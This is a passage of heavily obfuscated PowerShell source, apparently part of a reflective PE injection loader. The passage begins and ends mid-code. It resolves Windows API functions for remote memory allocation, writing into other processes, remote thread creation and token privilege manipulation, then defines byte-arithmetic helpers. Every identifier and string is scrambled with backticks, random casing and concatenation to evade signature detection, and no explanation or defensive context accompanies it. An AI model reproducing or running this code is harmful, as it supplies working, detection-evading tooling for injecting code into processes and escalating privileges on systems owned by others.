		${viRtUA`l`A`LLoCex} = [System.Runtime.InteropServices.Marshal]::('G'+'e'+'t'+'DelegateForFun'+'c'+'tio'+'n'+'Point'+'er').Invoke(${v`IRtU`Ala`lLoCe`x`AddR}, ${VirT`UAlal`lOceXde`leG`AtE})
		${WIn32FU`NCTi`O`NS} | &("{1}{0}{2}" -f 'be','Add-Mem','r') ('NoteP'+'roper'+'ty') -Name ('Vi'+'rtual'+'A'+'lloc'+'Ex') -Value ${v`IrTuA`lAL`LocEx}
		
		${MEM`CPY`AD`dR} = &("{2}{1}{0}{3}"-f'res','ProcAdd','Get-','s') ('msv'+'cr'+'t.dll') ('m'+'emcpy')
		${memCPy`Del`Eg`ATE} = &("{2}{3}{1}{0}{4}" -f'yp','eT','Get','-Delegat','e') @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${mEM`c`pY} = [System.Runtime.InteropServices.Marshal]::('G'+'etDelegateFor'+'Fu'+'nc'+'ti'+'o'+'nP'+'ointer').Invoke(${MEmCPYa`d`DR}, ${MeMcpy`DEL`eGA`TE})
		${WiN32FUncT`I`o`NS} | &("{0}{2}{1}" -f'Add-','er','Memb') -MemberType ('NoteP'+'r'+'op'+'erty') -Name ('memcp'+'y') -Value ${Mem`cPy}
		
		${m`emS`eTAD`DR} = &("{0}{4}{3}{1}{2}"-f'Get','d','ress','cAd','-Pro') ('m'+'svcrt.d'+'ll') ('memse'+'t')
		${me`mSe`TDElegA`Te} = &("{2}{3}{0}{1}" -f 'legateTyp','e','Get-','De') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${m`Em`Set} = [System.Runtime.InteropServices.Marshal]::('Ge'+'tDelegat'+'eF'+'o'+'rF'+'un'+'ctio'+'nPoin'+'ter').Invoke(${mEM`SETAd`dR}, ${MeMS`e`T`dELE`GaTE})
		${Wi`N32`F`UN`CTIoNS} | &("{1}{2}{0}"-f 'mber','A','dd-Me') -MemberType ('N'+'o'+'teProper'+'ty') -Name ('mems'+'et') -Value ${M`eMs`eT}
		
		${LoA`dLIBR`Ar`y`AddR} = &("{1}{4}{3}{0}{2}"-f'es','Get-','s','rocAddr','P') ('kernel3'+'2.'+'dll') ('LoadL'+'ibra'+'r'+'yA')
		${l`OAD`lIBRaryDeLEg`A`Te} = &("{3}{2}{0}{1}" -f '-Del','egateType','t','Ge') @([String]) ([IntPtr])
		${LoA`dLi`BR`ArY} = [System.Runtime.InteropServices.Marshal]::('G'+'etDel'+'egateF'+'or'+'FunctionP'+'o'+'int'+'er').Invoke(${l`O`A`DLIB`RARYAD`dR}, ${lOA`dlib`RArYDe`lEG`ATe})
		${wi`N32F`UnCt`iONS} | &("{0}{1}{2}"-f'Add-','Membe','r') -MemberType ('N'+'otePr'+'opert'+'y') -Name ('L'+'oadL'+'ibrary') -Value ${L`oadl`ibRary}
		
		${g`e`T`PROc`AddRESsA`dDr} = &("{0}{2}{4}{3}{1}"-f'Get-','s','Pro','es','cAddr') ('kernel32.'+'dl'+'l') ('GetProcAd'+'dres'+'s')
		${g`e`TP`R`OCadDrEsSDe`LEGaTE} = &("{2}{4}{1}{0}{3}" -f'ateT','eleg','Get-','ype','D') @([IntPtr], [String]) ([IntPtr])
		${get`PRocADD`R`E`Ss} = [System.Runtime.InteropServices.Marshal]::('GetD'+'eleg'+'ate'+'F'+'o'+'rFu'+'nctionPointer').Invoke(${getpR`oCAddr`E`s`SADdr}, ${Ge`TpRO`cadDre`sSdelEga`TE})
		${Win3`2F`UNct`i`OnS} | &("{0}{1}{2}" -f'Add-M','emb','er') -MemberType ('N'+'otePrope'+'rt'+'y') -Name ('Get'+'Proc'+'Ad'+'dress') -Value ${gE`TpRoC`AdDr`E`sS}
		
		${GeTp`ROC`AD`d`ReS`soR`d`InalADDR} = &("{2}{4}{1}{3}{0}" -f 'dress','Proc','Get','Ad','-') ('kernel3'+'2'+'.'+'dll') ('G'+'etProc'+'A'+'ddress')
		${GEtp`ROCad`DrE`SsO`R`di`NaL`dElEg`ATE} = &("{1}{3}{4}{0}{2}" -f 'T','G','ype','et-De','legate') @([IntPtr], [IntPtr]) ([IntPtr])
		${g`eT`P`ROCad`dR`esSOrDiNAL} = [System.Runtime.InteropServices.Marshal]::('Get'+'Delega'+'teFo'+'rF'+'unctionPoint'+'er').Invoke(${GEt`p`RocAdDr`E`SsOrDI`NAL`A`ddr}, ${geTp`ROCAD`d`Re`sSorDI`N`AlD`eLegA`TE})
		${Win3`2Fu`N`ctI`ONs} | &("{1}{0}{2}" -f 'dd-M','A','ember') -MemberType ('No'+'te'+'Propert'+'y') -Name ('GetProcA'+'ddr'+'essO'+'rdina'+'l') -Value ${gETpr`oCAd`DR`Es`SOr`dIN`Al}
		
		${vI`RT`UaL`F`REEADdr} = &("{0}{3}{2}{1}{4}" -f'Ge','Add','roc','t-P','ress') ('kernel3'+'2.dl'+'l') ('Virtu'+'alFr'+'ee')
		${VIRTu`A`l`FRee`deleGaTE} = &("{2}{3}{1}{0}" -f'Type','egate','G','et-Del') @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${Vi`Rtualfr`Ee} = [System.Runtime.InteropServices.Marshal]::('Ge'+'tD'+'ele'+'gateFor'+'Fun'+'ction'+'Pointe'+'r').Invoke(${VIRtualf`R`eEA`DdR}, ${vI`RTuAlfr`E`EDeleG`ATE})
		${WIN3`2F`UN`CtIONS} | &("{0}{2}{1}" -f'A','Member','dd-') ('Note'+'P'+'roperty') -Name ('Virtua'+'l'+'F'+'ree') -Value ${V`irTuA`lfree}
		
		${viR`T`UaLFReee`xad`Dr} = &("{0}{1}{4}{2}{3}"-f'Get-P','r','Addre','ss','oc') ('ker'+'nel32'+'.dl'+'l') ('VirtualFr'+'ee'+'E'+'x')
		${VIrTuA`LfRe`e`EX`dELEG`A`TE} = &("{4}{2}{0}{1}{3}" -f'elegateT','y','et-D','pe','G') @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${VIrtuAlF`R`ee`Ex} = [System.Runtime.InteropServices.Marshal]::('G'+'etDele'+'gat'+'eF'+'orF'+'u'+'nctionPo'+'inte'+'r').Invoke(${ViRT`UaLfR`EEE`xAD`dr}, ${V`I`RtUALFR`EeeX`D`E`LegAtE})
		${WIN`32FuN`c`T`IoNS} | &("{0}{1}{3}{2}"-f 'A','dd-','er','Memb') ('NotePro'+'pe'+'rty') -Name ('V'+'ir'+'tu'+'alFreeEx') -Value ${V`iR`TUaLfr`eeeX}
		
		${vIRTu`AL`prOtECT`AdDR} = &("{2}{0}{1}" -f 'et-ProcAddre','ss','G') ('k'+'erne'+'l32'+'.dll') ('V'+'irt'+'ualProtect')
		${v`IR`T`Ual`prOtecTDEL`EGATe} = &("{2}{3}{0}{1}"-f 'teT','ype','Get-','Delega') @([IntPtr], [UIntPtr], [UInt32], [UInt32].('M'+'ake'+'ByRefTy'+'pe').Invoke()) ([Bool])
		${vIR`T`UaLPr`oTeCt} = [System.Runtime.InteropServices.Marshal]::('GetD'+'elegateF'+'orFunctionPoin'+'te'+'r').Invoke(${ViRT`Ual`PRoTecT`ADdR}, ${Virtu`AlpR`O`Te`c`TdElEg`ATE})
		${w`IN32`FuNcT`iO`NS} | &("{0}{2}{1}" -f'Add-Me','er','mb') ('Not'+'eProper'+'ty') -Name ('Vir'+'t'+'ualProtec'+'t') -Value ${V`Irt`UaLpr`otEcT}
		
		${GE`Tmodu`L`ehAN`DLeAd`dr} = &("{4}{2}{1}{3}{0}" -f 'ddress','-Proc','t','A','Ge') ('k'+'er'+'nel32.'+'dll') ('Get'+'M'+'od'+'uleHandleA')
		${geTMO`DUl`EHAn`dLeD`ElEGAtE} = &("{1}{0}{3}{2}{4}" -f 'e','Get-D','teTyp','lega','e') @([String]) ([IntPtr])
		${GE`TModUle`HAN`DlE} = [System.Runtime.InteropServices.Marshal]::('Get'+'De'+'lega'+'t'+'e'+'ForFunction'+'Poi'+'nte'+'r').Invoke(${geTmoD`ULeHA`NdlE`AdDr}, ${G`eTmoDuleHa`N`dl`eDeLegatE})
		${WiN32`Fun`Ct`Io`NS} | &("{0}{1}{2}"-f'Add-','Mem','ber') ('No'+'t'+'ePr'+'operty') -Name ('G'+'et'+'ModuleH'+'and'+'le') -Value ${GetM`ODULE`hAN`d`le}
		
		${FrEe`lIbRA`RYAD`DR} = &("{0}{2}{1}{3}{4}"-f 'Get-P','d','rocA','dr','ess') ('kern'+'e'+'l32.dll') ('Fr'+'eeLib'+'rary')
		${fR`EElib`RARY`DeL`E`g`Ate} = &("{3}{2}{1}{0}" -f 'pe','Ty','et-Delegate','G') @([IntPtr]) ([Bool])
		${Fr`ee`Li`BRaRy} = [System.Runtime.InteropServices.Marshal]::('Ge'+'tDele'+'gateFo'+'r'+'Funct'+'ionPo'+'i'+'n'+'ter').Invoke(${FR`EeL`IbrarYa`ddr}, ${freEl`IbRA`RY`deLegate})
		${wIN`32Fu`NctI`ons} | &("{2}{1}{0}"-f 'er','mb','Add-Me') -MemberType ('NotePro'+'pert'+'y') -Name ('Fr'+'ee'+'Library') -Value ${FrE`EL`iBR`Ary}
		
		${op`enp`ROC`EsSa`DdR} = &("{1}{2}{0}{3}" -f'Add','Get','-Proc','ress') ('ke'+'rnel32'+'.'+'dll') ('OpenP'+'r'+'ocess')
	    ${OPeNProceS`sDe`lE`G`ATE} = &("{3}{0}{1}{2}{4}{5}" -f 't-De','lega','te','Ge','Typ','e') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${opE`NPrOc`E`SS} = [System.Runtime.InteropServices.Marshal]::('Ge'+'tDeleg'+'ateForF'+'unc'+'tionP'+'o'+'i'+'n'+'ter').Invoke(${op`enpRoCE`s`sad`dR}, ${OPe`NprocESs`DEl`EGATE})
		${wIN3`2`F`UnCTIoNs} | &("{1}{0}{2}" -f'dd-Me','A','mber') -MemberType ('NotePr'+'opert'+'y') -Name ('Ope'+'nP'+'roc'+'ess') -Value ${o`PEN`PR`oCEss}
		
		${Wa`iT`FoRSin`GLEObJ`e`ct`AdDR} = &("{2}{1}{0}"-f's','t-ProcAddres','Ge') ('kernel3'+'2.'+'d'+'ll') ('Wait'+'For'+'SingleOb'+'ject')
	    ${waitF`o`RsI`N`gLe`obj`eCT`DeLEGA`Te} = &("{0}{2}{1}{4}{3}" -f'Ge','Delega','t-','Type','te') @([IntPtr], [UInt32]) ([UInt32])
	    ${WAiTf`orS`ingLE`oBJ`ecT} = [System.Runtime.InteropServices.Marshal]::('GetDele'+'gateFo'+'r'+'F'+'unct'+'ion'+'Pointer').Invoke(${Wa`It`Fo`R`sin`glEobJeC`TadDr}, ${wAItf`oR`SiNG`LE`obJ`Ec`TdElEGate})
		${w`IN32fUnCTio`Ns} | &("{0}{2}{1}"-f'Ad','-Member','d') -MemberType ('N'+'otePr'+'o'+'perty') -Name ('Wa'+'it'+'For'+'SingleOb'+'ject') -Value ${W`A`It`FoRsInGleoB`J`ecT}
		
		${WR`IT`EPROceSsMEm`oR`yAd`DR} = &("{2}{0}{1}{3}" -f't-ProcAdd','re','Ge','ss') ('kern'+'el'+'3'+'2.dll') ('W'+'ritePr'+'o'+'cessMemory')
        ${Wr`ITEP`RoCe`ssMemOrYDE`legATE} = &("{2}{0}{1}{4}{3}"-f't-De','l','Ge','Type','egate') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].('MakeByRe'+'fTyp'+'e').Invoke()) ([Bool])
        ${Wri`Tepr`oceSSmem`ORy} = [System.Runtime.InteropServices.Marshal]::('GetDele'+'gateF'+'orFu'+'nct'+'ionP'+'ointe'+'r').Invoke(${Wri`TePRo`CeSs`M`e`m`ORy`ADdR}, ${w`R`ITEPR`O`CesSme`m`orYDELEGa`Te})
		${wIN3`2f`UN`ct`ioNs} | &("{2}{1}{3}{0}"-f'mber','d-','Ad','Me') -MemberType ('NoteP'+'r'+'o'+'perty') -Name ('Wr'+'it'+'e'+'P'+'rocessM'+'emory') -Value ${WrIt`e`PrOCEs`SMeM`o`RY}
		
		${rEAD`PROCes`smE`Mo`R`Y`ADDR} = &("{3}{0}{1}{2}" -f'-P','roc','Address','Get') ('ke'+'rnel3'+'2.d'+'ll') ('R'+'e'+'adPr'+'ocess'+'Memor'+'y')
        ${Re`ADPRocESSmem`o`RydE`l`EgAte} = &("{0}{1}{3}{2}{4}" -f'Ge','t','Delegat','-','eType') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].('Ma'+'keByRefT'+'yp'+'e').Invoke()) ([Bool])
        ${R`eAdpR`o`CEsSMEMO`RY} = [System.Runtime.InteropServices.Marshal]::('GetDelega'+'teF'+'o'+'r'+'Functi'+'onPoin'+'ter').Invoke(${rEADpRoCe`ssM`E`mOR`yaDDR}, ${reADprO`C`ESs`MemoRYdE`LEGA`TE})
		${WiN3`2`Fu`Nc`TIOnS} | &("{2}{0}{1}"-f'mbe','r','Add-Me') -MemberType ('NoteP'+'ro'+'per'+'ty') -Name ('R'+'ead'+'ProcessM'+'emo'+'ry') -Value ${REaD`p`Ro`cEsS`MemOry}
		
		${crE`At`er`em`otEThREAdAD`Dr} = &("{1}{2}{3}{0}"-f'ss','Ge','t-P','rocAddre') ('ke'+'r'+'nel32.'+'dll') ('Cre'+'ateRe'+'moteTh'+'read')
        ${cR`eAt`EremOteTH`REa`dd`eLeGATe} = &("{1}{3}{2}{0}"-f'e','Get','Typ','-Delegate') @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${crE`At`EreMOTEtHRE`Ad} = [System.Runtime.InteropServices.Marshal]::('GetDelegat'+'eF'+'orFuncti'+'onPo'+'inter').Invoke(${cReATeRE`MOTethR`eA`DA`dDR}, ${c`REATERe`moTET`h`R`E`ADde`LEG`AtE})
		${WiN3`2FUnct`i`ONS} | &("{2}{0}{1}"-f'dd-Memb','er','A') -MemberType ('N'+'ot'+'e'+'Property') -Name ('Cr'+'eateRe'+'moteThre'+'ad') -Value ${CRE`ATe`R`emoTe`Thr`EAd}
		
		${gE`TEXItcO`d`eTHR`EAdaddR} = &("{3}{0}{1}{2}"-f'et-Pr','ocAddr','ess','G') ('kern'+'el32.d'+'l'+'l') ('Get'+'Ex'+'itCodeThrea'+'d')
        ${gE`T`exItCoD`Ethre`AdDEle`g`Ate} = &("{1}{3}{2}{0}" -f'ateType','G','Deleg','et-') @([IntPtr], [Int32].('MakeB'+'y'+'R'+'efType').Invoke()) ([Bool])
        ${g`eteX`I`TCOde`THREaD} = [System.Runtime.InteropServices.Marshal]::('GetDe'+'legate'+'ForF'+'u'+'nc'+'tionP'+'ointer').Invoke(${GeTexIt`coD`E`THREa`d`ADDR}, ${g`Et`exITcOd`et`h`ReadDe`lEga`Te})
		${wIN32F`U`N`CtIons} | &("{0}{1}{2}" -f'Add-','Mem','ber') -MemberType ('N'+'otePro'+'p'+'erty') -Name ('Ge'+'tEx'+'itCodeTh'+'rea'+'d') -Value ${gETe`XiT`cOdEthRE`AD}
		
		${Op`E`NthRe`ADtok`enA`dDr} = &("{0}{2}{3}{1}{4}" -f 'Ge','dr','t-','ProcAd','ess') ('Advap'+'i'+'32.dll') ('OpenThr'+'eadTo'+'ke'+'n')
        ${oPEnthRE`AdT`okEn`d`ElEgaTE} = &("{2}{3}{0}{4}{1}" -f 'l','gateType','Get','-De','e') @([IntPtr], [UInt32], [Bool], [IntPtr].('MakeByRefT'+'yp'+'e').Invoke()) ([Bool])
        ${Ope`Nth`ReAD`TOkeN} = [System.Runtime.InteropServices.Marshal]::('Get'+'Del'+'e'+'gateF'+'o'+'rFu'+'nctionPoin'+'ter').Invoke(${oPeNth`Re`ADTOk`e`NAd`Dr}, ${op`en`ThREadtO`KeNd`e`l`Eg`AtE})
		${wIN3`2FuNC`TI`ONs} | &("{2}{0}{3}{1}" -f'-','mber','Add','Me') -MemberType ('NoteP'+'rop'+'e'+'rty') -Name ('OpenThr'+'eadT'+'o'+'ken') -Value ${O`PEnThrEad`To`K`En}
		
		${gEtCu`RRE`N`TthReada`DdR} = &("{1}{2}{0}{3}"-f 's','Get-Pr','ocAddre','s') ('kerne'+'l'+'32.dll') ('G'+'etCu'+'rre'+'nt'+'Thread')
        ${G`eTCurre`Ntthre`AD`delegaTE} = &("{3}{0}{2}{4}{1}" -f'et','eType','-Deleg','G','at') @() ([IntPtr])
        ${GeTcUrReN`Tt`H`READ} = [System.Runtime.InteropServices.Marshal]::('G'+'et'+'Delegate'+'F'+'orFuncti'+'onPo'+'inter').Invoke(${geTC`UrReN`TthreaD`ADDr}, ${GETC`UrreNTt`hrEa`DDeL`E`gatE})
		${WiN32FU`Nct`IO`NS} | &("{0}{3}{1}{2}" -f 'Ad','-M','ember','d') -MemberType ('NoteProp'+'e'+'rty') -Name ('Get'+'Curr'+'ent'+'Thread') -Value ${GEtC`Ur`R`EnTTHr`EaD}
		
		${adju`stToKEnP`RIv`Il`EGE`S`AdDR} = &("{0}{2}{1}" -f'Get-','s','ProcAddres') ('Advapi'+'32.d'+'l'+'l') ('A'+'djustT'+'o'+'ke'+'nPr'+'ivile'+'ges')
        ${Adj`U`s`TTokE`NPrIVileg`e`SdELeGaTE} = &("{1}{3}{2}{4}{0}" -f'pe','Get-De','at','leg','eTy') @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${Adju`s`TTo`kenPRiVIL`egEs} = [System.Runtime.InteropServices.Marshal]::('Get'+'Del'+'ega'+'teForFun'+'c'+'tionPoin'+'ter').Invoke(${adjU`stto`kenpr`I`VIl`eG`Es`Addr}, ${AdJUSttO`KENp`R`i`VILE`geS`dELeGatE})
		${Win32FU`Ncti`ONs} | &("{0}{2}{1}"-f'Add-','ber','Mem') -MemberType ('N'+'otePr'+'operty') -Name ('A'+'dju'+'s'+'t'+'TokenPrivi'+'leg'+'es') -Value ${a`DJuSTt`OK`eN`priVileGEs}
		
		${Look`UPP`RIVileG`eV`A`LUE`A`dDR} = &("{1}{2}{0}{3}{4}"-f'P','Get','-','rocAddres','s') ('Adva'+'pi'+'32.dl'+'l') ('Lookup'+'Priv'+'ilege'+'Valu'+'eA')
        ${lo`O`K`UpPR`IVIL`Ege`VaL`UedeLeg`ATE} = &("{3}{2}{0}{1}"-f'gateT','ype','Dele','Get-') @([String], [String], [IntPtr]) ([Bool])
        ${lOokU`PPrI`Vi`lEG`eVA`lue} = [System.Runtime.InteropServices.Marshal]::('G'+'et'+'Deleg'+'ateForF'+'unct'+'ion'+'Poi'+'n'+'ter').Invoke(${LO`OkUPp`R`IVilegEvAL`UEadDR}, ${lOO`Ku`PPrIVI`lege`V`ALueDElEGAtE})
		${wIN3`2F`U`NCtIONs} | &("{2}{0}{1}" -f'dd-Memb','er','A') -MemberType ('N'+'oteProper'+'t'+'y') -Name ('Lo'+'ok'+'up'+'Privi'+'legeV'+'al'+'ue') -Value ${Look`UPPR`i`Vile`GEvalue}
		
		${impe`R`soNaT`ES`Elfa`ddr} = &("{2}{1}{0}"-f's','Addres','Get-Proc') ('Ad'+'v'+'api'+'32.dll') ('Im'+'personat'+'eSelf')
        ${IMPer`So`NaT`es`EL`F`dELE`gAtE} = &("{3}{2}{0}{1}" -f'at','eType','t-Deleg','Ge') @([Int32]) ([Bool])
        ${I`MPers`OnATeSe`lF} = [System.Runtime.InteropServices.Marshal]::('GetDeleg'+'a'+'teForF'+'u'+'nctionPoin'+'ter').Invoke(${iMpE`R`SonA`T`E`SeLfAddR}, ${ImPe`RSOn`ATeSe`LFDeLEga`TE})
		${wIn`3`2`FUn`cTioNs} | &("{2}{1}{0}"-f 'mber','e','Add-M') -MemberType ('NoteP'+'rop'+'erty') -Name ('I'+'mp'+'ersona'+'t'+'eSelf') -Value ${IMp`E`RSon`AteSE`lf}
		
        
        if (([Environment]::"OS`VersI`ON"."V`eRS`IoN" -ge (&("{0}{3}{1}{2}"-f 'N','bjec','t','ew-O') (("{0}{1}{2}"-f 'Ve','rs','io')+'n') 6,0)) -and ([Environment]::"o`sVErsi`on"."verS`I`On" -lt (&("{1}{2}{0}{3}" -f'bje','New','-O','ct') ('Ver'+("{0}{1}"-f'si','on')) 6,2))) {
		    ${NtcREa`T`eTHRE`ADE`XaDDr} = &("{2}{3}{1}{0}" -f 'ddress','cA','Get-Pr','o') ('Nt'+'Dl'+'l.d'+'ll') ('N'+'tC'+'rea'+'t'+'eThreadEx')
            ${Nt`CRE`ATETHR`eadEX`dELe`GA`Te} = &("{3}{0}{2}{1}{4}" -f'et','teTy','-Delega','G','pe') @([IntPtr].('MakeByRe'+'fT'+'ype').Invoke(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${N`T`CRea`TEThR`e`AdeX} = [System.Runtime.InteropServices.Marshal]::('Ge'+'tDelegateF'+'orFunct'+'ionP'+'oi'+'n'+'ter').Invoke(${ntCReA`T`eTHr`EADex`ADDr}, ${n`Tc`REA`TeThREAdE`xdElEgAte})
		    ${W`in32fU`NC`T`IONs} | &("{3}{0}{2}{1}"-f'-M','mber','e','Add') -MemberType ('N'+'oteP'+'r'+'operty') -Name ('NtC'+'reate'+'Thr'+'eadE'+'x') -Value ${NT`CREAt`eT`h`ReAdex}
        }
		
		${i`sWOW6`4`PROcE`ssAddr} = &("{4}{3}{2}{1}{0}"-f'ress','dd','A','t-Proc','Ge') ('Kern'+'el32'+'.d'+'ll') ('Is'+'Wow6'+'4Pro'+'cess')
        ${iSw`Ow64pr`Oce`sS`De`leGatE} = &("{2}{0}{3}{1}"-f't-Deleg','Type','Ge','ate') @([IntPtr], [Bool].('MakeB'+'y'+'RefType').Invoke()) ([Bool])
        ${i`s`WoW64`P`RocEss} = [System.Runtime.InteropServices.Marshal]::('GetDelegat'+'e'+'For'+'Func'+'tionPointer').Invoke(${I`SWO`w`64procEsSAd`dr}, ${ISWoW64`p`RoCe`ssDEL`E`Ga`TE})
		${WI`N32fun`CtIo`NS} | &("{1}{0}{2}" -f'dd-M','A','ember') -MemberType ('N'+'o'+'tePropert'+'y') -Name ('IsWo'+'w6'+'4Process') -Value ${I`swow64pRO`c`ess}
		
		${c`Rea`TETHRe`A`d`ADDr} = &("{2}{3}{1}{0}"-f 's','es','Get-ProcAdd','r') ('Kern'+'e'+'l'+'32.dll') ('C'+'reateThre'+'a'+'d')
        ${c`Rea`TETH`REaDd`ELEgAte} = &("{4}{5}{3}{2}{0}{1}"-f'Ty','pe','ate','leg','Get','-De') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].('M'+'akeByRef'+'Type').Invoke()) ([IntPtr])
        ${cr`EATE`T`hreaD} = [System.Runtime.InteropServices.Marshal]::('Ge'+'tDe'+'legateFo'+'rF'+'unctio'+'n'+'Pointe'+'r').Invoke(${c`RE`AtethreADA`Ddr}, ${c`R`EATEtHREADdelE`GatE})
		${w`IN32FUnCT`iOns} | &("{0}{2}{1}"-f'Ad','Member','d-') -MemberType ('Not'+'ePr'+'ope'+'rty') -Name ('Creat'+'e'+'Thr'+'ead') -Value ${CRe`AtE`T`hrEAd}
	
		${lo`C`AlfRe`eadDr} = &("{4}{2}{0}{1}{3}" -f'rocAddr','es','-P','s','Get') ('ke'+'rne'+'l'+'32.dll') ('VirtualF'+'re'+'e')
		${LO`cALf`Re`EDEl`egA`TE} = &("{3}{1}{2}{0}"-f 'pe','-Delega','teTy','Get') @([IntPtr])
		${l`O`C`ALfrEe} = [System.Runtime.InteropServices.Marshal]::('GetDelegateF'+'or'+'Fu'+'n'+'ction'+'Poin'+'ter').Invoke(${lOCaL`F`R`EeadDr}, ${lOca`LFrEE`de`LE`gate})
		${WIn32f`UN`CT`i`Ons} | &("{1}{0}{3}{2}"-f'dd-Me','A','ber','m') ('Not'+'e'+'Propert'+'y') -Name ('Lo'+'c'+'alFree') -Value ${LoC`Al`FReE}

		return ${w`iN32F`UncTiONs}
	}
	

			
	
	
	

	
	
	Function su`B`-s`igned`I`N`TasUNsigNeD
	{
		Param(
		[Parameter(pOsItion = 0, MaNdATorY = ${tr`Ue})]
		[Int64]
		${v`AlU`e1},
		
		[Parameter(pOSiTiOn = 1, mANDAToRY = ${t`Rue})]
		[Int64]
		${v`A`LUe2}
		)
		
		[Byte[]]${Val`Ue1bYt`Es} = [BitConverter]::('Ge'+'tB'+'ytes').Invoke(${v`AlU`E1})
		[Byte[]]${VaLUE`2B`Yt`Es} = [BitConverter]::('Ge'+'tByte'+'s').Invoke(${VA`lUE2})
		[Byte[]]${fi`Na`lBYtES} = [BitConverter]::"ge`TBY`TES"([UInt64]0)

		if (${V`A`LuE1`ByTes}."co`UnT" -eq ${va`luE`2bY`TES}."CoU`Nt")
		{
			${cAr`R`YoVer} = 0
			for (${i} = 0; ${i} -lt ${ValUE`1By`Tes}."C`ounT"; ${I}++)
			{
				${v`Al} = ${val`UE1BYt`eS}[${I}] - ${cA`RrYOv`eR}
				
				if (${v`Al} -lt ${vA`lue`2BytEs}[${i}])
				{
					${V`AL} += 256
					${C`Arryo`VER} = 1
				}
				else
				{
					${c`ArRYo`V`ER} = 0
				}
				
				
				[UInt16]${s`Um} = ${V`Al} - ${VAlU`e2`B`YTes}[${I}]

				${fINa`LB`YTES}[${i}] = ${s`UM} -band 0x00FF
			}
		}
		else
		{
			Throw ('Can'+("{0}{1}" -f 'not',' ')+'sub'+("{1}{2}{0}"-f' bytear','trac','t')+'r'+'a'+'y'+'s '+'of '+'dif'+'fe'+'r'+("{1}{0}{2}" -f' s','ent','izes'))
		}
		
		return [BitConverter]::('ToIn'+'t6'+'4').Invoke(${FINALbY`T`es}, 0)
	}
	

	Function ADd-sIg`N`eDINt`AS`UNsi`gnED
	{
		Param(
		[Parameter(POSItioN = 0, MANdATorY = ${T`Rue})]
		[Int64]
		${VA`lUE1},
		
		[Parameter(poSITIoN = 1, manDATory = ${TR`Ue})]
		[Int64]
		${vAl`U`E2}
		)
		
		[Byte[]]${VAL`UE1BY`T`ES} = [BitConverter]::('GetByt'+'e'+'s').Invoke(${VA`L`UE1})
		[Byte[]]${v`Al`U`e2BYTes} = [BitConverter]::('Ge'+'tBytes').Invoke(${v`AlU`E2})
		[Byte[]]${Fin`AL`BY`TEs} = [BitConverter]::"G`Et`BYTES"([UInt64]0)

		if (${vALue1B`YT`Es}."COu`Nt" -eq ${v`ALu`e2By`Tes}."c`oUnT")
		{
			${c`ARR`yoveR} = 0
			for (${I} = 0; ${i} -lt ${vA`LuE1b`YTES}."c`OUnt"; ${I}++)
			{
				
				[UInt16]${S`UM} = ${valUe1`B`yTes}[${i}] + ${ValU`e2by`TES}[${i}] + ${C`AR`RYOVeR}

				${Fin`Alb`yt`ES}[${I}] = ${s`UM} -band 0x00FF
				
				if ((${s`Um} -band 0xFF00) -eq 0x100)
				{
					${c`A`RrYOvEr} = 1
				}
				else
				{
					${car`RyOV`Er} = 0
				}
			}
		}
		else
		{
			Throw ('C'+'ann'+'ot'+("{0}{3}{1}{2}" -f ' a','t','earr','dd by')+'a'+("{0}{1}" -f'ys',' of')+("{1}{0}"-f 'dif',' ')+("{1}{0}" -f 'ere','f')+'nt '+("{1}{0}" -f 's','size'))
		}
		
		return [BitConverter]::('ToIn'+'t64').Invoke(${FI`Na`L`BYTeS}, 0)
	}
	

	Function COmPa`RE-VAL1g`R`EaTe`RTHa`N`Val`2aSuInT
	{
		Param(
		[Parameter(POSITIon = 0, MaNDAtOry = ${t`RUe})]
		[Int64]
		${vA`Lu`E1},
		
		[Parameter(poSItiOn = 1, Mandatory = ${T`RUe})]
		[Int64]
		${VA`lUE2}
		)
		
		[Byte[]]${v`AlU`E1B`yTes} = [BitConverter]::('G'+'etBytes').Invoke(${V`ALuE1})
		[Byte[]]${vaL`Ue2b`yt`Es} = [BitConverter]::('Ge'+'tBy'+'tes').Invoke(${v`ALuE2})

		if (${vAlU`E1B`yteS}."c`Ount" -eq ${VAl`U`E2`BYTeS}."cOu`Nt")
		{
			for (${I} = ${vaLUe`1by`Tes}."c`oUNt"-1; ${I} -ge 0; ${i}--)
			{
				if (${v`ALUe1`B`yTeS}[${i}] -gt ${ValUE2bY`T`es}[${I}])
				{
					return ${T`RUe}
				}
				elseif (${VAL`UE1by`TeS}[${i}] -lt ${v`AL`UE2by`Tes}[${i}])
				{
					return ${fa`l`Se}
				}
			}
		}
		else
		{
			Throw ('Ca'+("{1}{0}"-f 'not ','n')+'c'+("{0}{1}{2}"-f'ompa','re',' ')+("{1}{0}"-f'e','byt')+' a'+("{1}{0}" -f'rays of ','r')+("{0}{3}{4}{1}{2}" -f'd','nt si','ze','iffe','re'))
		}
		
		return ${faL`SE}
	}
	

	Function cOnVe`RT-uINt`Toi`Nt
	{
		Param(
		[Parameter(poSITiON = 0, MAnDaTorY = ${TR`Ue})]
		[UInt64]
		${V`A`Lue}
		)
		
		[Byte[]]${va`LUEb`y`TES} = [BitConverter]::('G'+'etByte'+'s').Invoke(${v`A`LUE})
		return ([BitConverter]::('ToInt'+'64').Invoke(${v`AlUEB`YTeS}, 0))
	}
	
	
	Function Test-`ME`mOR`Yr`ANg`EvaLid
	{
		Param(
		[Parameter(PosItiON = 0, MaNDaTOry = ${tR`UE})]
		[String]
		${dE`BU`GsTR`InG},
		
		[Parameter(position = 1, MANDaTOry = ${T`RuE})]
		[System.Object]
		${P`EIn`Fo},
		
		[Parameter(poSITion = 2, MANdaTORY = ${t`RUE})]
		[IntPtr]
		${S`TARt`ADDre`sS},
		
		[Parameter(paraMeteRseTName = "Si`zE", poSitiOn = 3, MaNDAtOrY = ${Tr`UE})]
		[IntPtr]
		${si`ZE}
		)
		
